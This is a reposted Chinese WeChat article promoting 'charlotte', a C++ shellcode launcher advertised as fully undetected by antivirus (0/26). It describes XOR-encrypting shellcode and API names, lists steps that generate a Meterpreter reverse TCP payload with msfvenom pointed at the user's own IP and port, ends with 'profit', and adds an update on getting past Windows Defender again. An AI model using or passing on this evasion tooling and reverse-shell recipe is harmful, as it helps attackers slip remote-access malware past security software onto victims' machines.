> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/YQ84lU6OuJz2KpS0_4teCg)

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV3OWcHe6kEjmyOzhzgjQY75tibd5XtY207iafygpgzmkyNGFZUmGKgjSyW9CxhbhnzJRTrH4ZIFia28g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV3OWcHe6kEjmyOzhzgjQY759lDxbzTicKMy0ulAziabFhDayIyUenIR2V21kXy069DlibLXXdxcLtKVg/640?wx_fmt=png)

2021 年 5 月 13 日：

1.  c ++ shellcode 启动器，截至 2021 年 5 月 13 日完全未检测到 0/26。
    
2.  动态调用 win32 api 函数
    
3.  Shellcode 和函数名称的 XOR 加密
    
4.  每次运行随机 XOR 键和变量
    
5.  在 Kali Linux 上，只需 “apt-get install mingw-w64 *” 就可以了！
    

2021 年 5 月 17 日：

    1. 随机字符串长度和 XOR 键长度

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV3OWcHe6kEjmyOzhzgjQY75LricnOc7UCR3QlND5wSVhaggJDsdK7oXTrkrxLl76lpctJeswyVqbMg/640?wx_fmt=png)

**用法**  

        git 克隆存储库，使用 beacon.bin 命名生成您的 shellcode 文件，然后运行 charlotte.py

例子：

1.  git clone https://github.com/9emin1/charlotte.git && apt-get install mingw-w64*
    
2.  cd charlotte
    
3.  msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$YOUR_IP LPORT=$YOUR_PORT -f raw > beacon.bin
    
4.  python charlotte.py
    
5.  profit
    

更新 v1.1
-------

2021/05/21：

显然，Microsoft Windows Defender 能够检测到. DLL 二进制文件，以及他们如何标记它？通过寻找几个 16 字节大小的 XOR 键将其更改为以下 POC .gif 中显示的 9 表示现在再次未被检测到。

项目地址：

https://github.com/9emin1/charlotte